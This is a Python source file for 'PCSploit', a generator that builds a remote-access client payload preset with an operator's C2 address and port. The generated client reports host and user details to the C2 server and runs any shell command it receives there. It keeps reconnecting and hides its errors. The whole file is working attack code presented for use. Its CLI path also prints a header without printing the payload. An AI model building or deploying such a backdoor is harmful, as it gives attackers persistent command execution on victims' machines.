"""
PCSploit Payload Generator
Creates a custom client payload with YOUR C2 server IP and port pre-configured.
"""

# We need os for file operations when saving the payload
import os


def generate_payload(lhost, lport, output_file=None):
    """
    Generates a PCSploit client payload.
    
    Args:
        lhost (str): Your C2 server's IP address (e.g., "192.168.1.100")
        lport (int): Your C2 server's port (e.g., 4443)
        output_file (str, optional): Where to save the .py file
    
    Returns:
        str: The complete payload code
    """
    
    # This is the CLIENT code as a template string.
    # The {lhost} and {lport} will be replaced with YOUR values.
    # 
    # Notice the double curly braces {{ }} — in Python's .format(),
    # {{ becomes a single { and }} becomes a single }.
    # This is so the generated payload has real curly braces in it.
    
    client_code = '''"""
PCSploit Client Payload
Auto-generated — Target server: {lhost}:{lport}
"""

import socket
import os
import platform
import json
import time
import subprocess


def get_system_info():
    """Collect target machine information."""
    info = {{
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "arch": platform.machine(),
        "username": os.environ.get("USERNAME") or os.environ.get("USER") or "unknown",
        "cwd": os.getcwd(),
        "pid": os.getpid(),
    }}
    return info


def execute_command(command):
    """Run a shell command and return the result."""
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=60
        )
        return {{
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }}
    except subprocess.TimeoutExpired:
        return {{"error": "Command timed out"}}
    except Exception as e:
        return {{"error": str(e)}}


def connect():
    """Connect to C2 server and handle commands."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # ===== YOUR C2 SERVER =====
            sock.connect(("{lhost}", {lport}))
            # ===========================
            
            # Send system info on connect
            info = get_system_info()
            sock.sendall(json.dumps(info).encode() + b"\\n")
            
            # Command loop
            while True:
                try:
                    sock.settimeout(5)
                    data = sock.recv(65536)
                    if not data:
                        break
                    
                    command = data.decode("utf-8").strip()
                    
                    if command.lower() == "exit":
                        break
                    elif command.lower() == "ping":
                        sock.sendall(b"pong\\n")
                    elif command.lower() == "info":
                        sock.sendall(json.dumps(get_system_info()).encode() + b"\\n")
                    else:
                        result = execute_command(command)
                        output = json.dumps(result).encode() + b"\\n"
                        sock.sendall(output)
                        
                except socket.timeout:
                    try:
                        sock.sendall(b"\\n")
                    except:
                        break
                except:
                    break
            
            sock.close()
        except:
            pass
        time.sleep(10)


if __name__ == "__main__":
    connect()
'''
    
    # Replace the placeholders with actual values
    # {lhost} → "192.168.1.100"
    # {lport} → 4443
    payload = client_code.format(lhost=lhost, lport=lport)
    
    # If an output file was specified, save it there
    if output_file:
        with open(output_file, "w") as f:
            f.write(payload)
        print(f"[+] Payload saved to: {output_file}")
    
    # Return the code (whether we saved it or not)
    return payload


def main():
    """CLI entry point."""
    import sys
    
    # Check that we got enough arguments
    if len(sys.argv) < 3:
        print("Usage: python generator.py <LHOST> <LPORT> [output_file]")
        print("")
        print("Arguments:")
        print("  LHOST        Your C2 server's IP address")
        print("  LPORT        Your C2 server's port number")
        print("  output_file  (Optional) Where to save the payload")
        print("")
        print("Examples:")
        print("  python generator.py 192.168.1.100 4443")
        print("  python generator.py 192.168.1.100 4443 payload.py")
        return
    
    # Parse arguments
    lhost = sys.argv[1]          # First arg = your IP
    lport = int(sys.argv[2])     # Second arg = your port
    output = sys.argv[3] if len(sys.argv) > 3 else None  # Third = output file
    
    # Generate the payload
    generate_payload(lhost, lport, output)
    
    # If no output file specified, print the code to terminal
    if not output:
        print("[+] Payload code:\n")


if __name__ == "__main__":
    main()
